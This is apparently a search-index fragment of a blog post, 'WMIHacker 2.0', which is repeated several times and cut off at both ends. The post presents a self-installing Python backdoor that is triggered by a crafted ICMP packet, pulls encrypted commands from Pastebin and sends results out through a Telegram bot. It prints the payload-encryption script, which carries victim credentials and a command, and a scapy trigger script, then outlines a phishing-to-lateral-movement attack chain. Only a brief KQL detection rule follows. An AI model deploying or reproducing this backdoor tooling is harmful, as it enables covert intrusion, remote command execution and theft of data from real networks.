networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifi\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server 